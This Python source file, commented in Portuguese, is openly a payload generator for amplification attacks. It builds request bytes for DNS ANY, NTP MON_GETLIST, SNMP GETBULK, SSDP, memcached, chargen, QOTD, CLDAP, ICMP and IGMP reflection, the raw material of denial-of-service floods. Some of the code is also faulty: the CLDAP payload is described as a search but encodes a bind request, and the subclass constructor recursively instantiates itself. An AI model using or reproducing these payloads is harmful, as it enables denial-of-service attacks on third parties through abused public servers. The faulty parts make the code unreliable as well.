"""
Payloads específicos para protocolos de amplificação
"""
import struct
import random
from typing import Dict

class ProtocolPayloadGenerator:
    """Gera payloads para ataques de amplificação"""
    
    def generate_dns_amplification(self) -> bytes:
        """Gera payload DNS para amplificação"""
        # Header: ID=1, Recursion Desired, Query
        header = struct.pack('!HHHHHH', 1, 0x0100, 1, 0, 0, 0)
        
        # Query: ANY para google.com (retorna grande resposta)
        query = b'\x06google\x03com\x00\x00\xff\x00\x01'
        
        return header + query
    
    def generate_ntp_amplification(self) -> bytes:
        """Gera payload NTP MON_GETLIST (amplificação)"""
        # NTP version 2, mode 3 (client), request MON_GETLIST
        return b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    def generate_snmp_amplification(self) -> bytes:
        """Gera payload SNMP GETBULK para amplificação"""
        # SNMPv2c GETBULK request com community public
        return bytes.fromhex(
            '3026'  # Sequence length 38
            '0201 01'  # SNMP version 2c (1)
            '0406 7075 626c 6963'  # community "public"
            'a519'  # GetBulk PDU
            '0204 022d 6f49'  # request ID
            '0201 00'  # non-repeaters
            '0201 00'  # max-repetitions
            '300b 3009 0605 2b06 0102 0115 00'  # OID .1.3.6.1.2.1.25.1.0
        )
    
    def generate_ssdp_amplification(self) -> bytes:
        """Gera payload SSDP M-SEARCH"""
        return (
            b'M-SEARCH * HTTP/1.1\r\n'
            b'HOST: 239.255.255.250:1900\r\n'
            b'MAN: "ssdp:discover"\r\n'
            b'MX: 1\r\n'
            b'ST: ssdp:all\r\n'
            b'USER-AGENT: UPnP/1.0\r\n'
            b'\r\n'
        )
    
    def generate_memcached_amplification(self) -> bytes:
        """Gera payload Memcached para amplificação"""
        # Comando 'stats' retorna grande quantidade de dados
        return b'stats\r\n'
    
    def generate_chargen_payload(self) -> bytes:
        """Gera payload Chargen"""
        return b'\x00'  # Qualquer byte inicia resposta
    
    def generate_qotd_payload(self) -> bytes:
        """Gera payload QOTD"""
        return b'\x00'  # Qualquer byte inicia resposta
    
    def generate_cldap_payload(self) -> bytes:
        """Gera payload CLDAP para amplificação"""
        # SearchRequest LDAP sem autenticação
        return bytes.fromhex(
            '3020'  # LDAP Message
            '0201 01'  # Message ID: 1
            '601b'  # Bind Request
            '0201 03'  # Version: 3
            '0400'  # Name: (empty)
            '8000'  # Authentication: simple (empty)
        )
    
    def generate_icmp_payload(self, size: int = 64) -> bytes:
        """Gera payload ICMP Echo Request"""
        # Cabeçalho ICMP (8 bytes) + dados
        icmp_type = 8  # Echo Request
        icmp_code = 0
        checksum = 0
        identifier = random.randint(0, 65535)
        sequence = random.randint(0, 65535)
        
        # Cabeçalho ICMP
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
        
        # Dados (preenchimento)
        data = random._urandom(size - 8)
        
        return header + data
    
    def generate_igmp_payload(self) -> bytes:
        """Gera payload IGMP"""
        # IGMP Membership Report
        return bytes.fromhex(
            '22'  # Type: IGMPv3 Membership Report
            '00'  # Max Response Time
            'f6fa'  # Checksum
            '0000'  # Reserved
            '0001'  # Number of Group Records
            '04'  # Record Type: Change to Include Mode
            '00'  # Aux Data Len
            '0000'  # Number of Sources
            'e000 0001'  # Multicast Address: 224.0.0.1
        )

class PayloadGenerator(ProtocolPayloadGenerator):
    """Generator principal que combina todos os tipos de payload"""
    
    def __init__(self):
        super().__init__()
        self.generator = PayloadGenerator()
    
    # Herda todos os métodos de ProtocolPayloadGenerator
    # e adiciona compatibilidade com a interface esperada